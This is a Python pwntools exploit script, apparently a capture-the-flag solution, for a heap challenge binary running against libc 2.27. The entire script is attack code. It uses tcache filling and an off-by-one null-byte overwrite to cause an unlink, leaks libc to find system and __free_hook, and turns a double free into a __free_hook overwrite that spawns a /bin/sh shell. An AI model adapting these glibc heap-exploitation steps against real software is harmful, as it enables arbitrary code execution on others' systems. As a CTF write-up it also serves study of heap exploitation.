from pwn import *


ld_path = "libc-2.27.so"
p = process([ld_path, "pwn"])

def new(topic, size, con, score):
    p.recvuntil("your choice>>")
    p.send("1")
    p.recvuntil("topic name:")
    p.send(topic)
    p.recvuntil("des size:")
    p.sendline(str(size))
    p.recvuntil("topic des:")
    p.send(con)
    p.recvuntil("topic score:")
    p.sendline(str(score))


def free(idx):
    p.recvuntil("your choice>>")
    p.send("2")
    p.recvuntil("index:")
    p.sendline(str(idx))


def show(idx):
    p.recvuntil("your choice>>")
    p.send("3")
    p.recvuntil("index:")
    p.sendline(str(idx))

# login
p.recvuntil("input manager name:")
name = b"CTFM"
p.sendline(name)
p.recvuntil("input password:")
passwd = "123456"
p.sendline(passwd)

# avoid tcache
for i in range(7):
    new("a", 0xf8, "a", 0xf8)
new("a", 0xf8, "a", 0xf8)  # 7
new("a", 0x28, "a", 0x28)  # 8
new("a", 0xf8, "a", 0xf8)  # 9
for i in range(7):
    free(i)
new("a", 0x20, "a", 0x20)  # 0
# pause()
# 7 8 9 0     in_use
# 1 2 3 4 5 6 in_free

# unlink
free(7)
free(8)
pad = cyclic(0x20)+p16(0x30+0x100)+b"a"*6
new("a", 0x28, pad, 0x28)  # 1
for i in range(6):
    free(1)
    pad = cyclic(0x20)+p16(0x30+0x100)+b"a"*(5-i)
    new("a", 0x28, pad, 0x28)  # 1
free(9)

# leak
for i in range(7):
    new("a", 0xf8, "a", 0xf8)
# 2 3 4 5 6 7 8  in_use
new("a", 0xf8, "a", 0xf8)  # 9
show(1)
# print(p.recv())
p.recvuntil("topic des:")
info = p.recvuntil("topic", drop=True)
info = u64(info.ljust(8, b"\x00"))
print(hex(info))

# count
libc = ELF("libc-2.27.so")
base = info-0x70-libc.sym["__malloc_hook"]
print("base ", hex(base))
sys = base+libc.sym["system"]
f_hook = base+libc.sym["__free_hook"]
print("sys ", hex(sys))
print("f_hook ", hex(f_hook))

# double free
free(2)
free(3)
new("a", 0x28, "a", 0x28)  # 2
free(1)
free(2)
new("a", 0x28, p64(f_hook-8), 0x28) # 1
new("a", 0x28, "a", 0x28)           # 2
new("a", 0x28, b"/bin/sh;"+p64(sys), 0x28) # 3

# attack
free(3)

p.interactive()
